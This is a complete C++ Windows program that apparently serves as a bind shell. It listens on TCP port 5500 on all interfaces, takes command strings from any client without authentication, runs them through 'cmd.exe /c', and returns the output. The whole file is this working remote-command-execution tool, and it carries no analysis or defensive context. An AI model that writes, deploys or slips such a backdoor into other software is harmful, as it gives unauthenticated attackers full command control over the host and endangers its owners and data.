#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#define BUFFER_SIZE 4096
#define PORT 5500

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <thread>
#include <cstdio>

#pragma comment(lib, "Ws2_32.lib")

void handleClient(SOCKET clientSocket) {
    char recvBuffer[BUFFER_SIZE];

    std::cout << "[+] Client connected. Handling in new thread.\n";

    while (true) {
        ZeroMemory(recvBuffer, BUFFER_SIZE);
        int bytesReceived = recv(clientSocket, recvBuffer, BUFFER_SIZE - 1, 0);
        if (bytesReceived <= 0) {
            std::cout << "[-] Client disconnected.\n";
            break;
        }

        recvBuffer[bytesReceived] = '\0';
        std::cout << "[*] Command received: " << recvBuffer << "\n";

        if (strcmp(recvBuffer, "exit") == 0) {
            std::cout << "[*] Client requested exit.\n";
            break;
        }

        std::string command = "cmd.exe /c ";
        command += recvBuffer;

        FILE* pipe = _popen(command.c_str(), "r");
        if (!pipe) {
            const char* errorMsg = "Failed to execute command.\n";
            send(clientSocket, errorMsg, strlen(errorMsg), 0);
            continue;
        }

        char outputBuffer[BUFFER_SIZE];
        std::string allOutput;
        while (fgets(outputBuffer, BUFFER_SIZE, pipe)) {
            allOutput += outputBuffer;
        }
        _pclose(pipe);

        if (allOutput.empty()) {
            allOutput = "Command executed, but no output returned (or invalid command).\n";
        }

        send(clientSocket, allOutput.c_str(), allOutput.size(), 0);
    }

    closesocket(clientSocket);
    std::cout << "[*] Closed client connection.\n";
}

int main() {
    WSADATA wsaData;
    SOCKET listeningSocket;
    sockaddr_in serverAddr;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "[-] WSAStartup failed.\n";
        return 1;
    }

    listeningSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listeningSocket == INVALID_SOCKET) {
        std::cerr << "[-] Socket creation failed.\n";
        WSACleanup();
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);

    if (bind(listeningSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "[-] Bind failed.\n";
        closesocket(listeningSocket);
        WSACleanup();
        return 1;
    }

    if (listen(listeningSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "[-] Listen failed.\n";
        closesocket(listeningSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "[+] Server listening on port " << PORT << "...\n";

    while (true) {
        SOCKET clientSocket = accept(listeningSocket, nullptr, nullptr);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "[-] Accept failed.\n";
            continue;
        }

        std::thread clientThread(handleClient, clientSocket);
        clientThread.detach();  // Let the thread run independently
    }

    closesocket(listeningSocket);
    WSACleanup();
    return 0;
}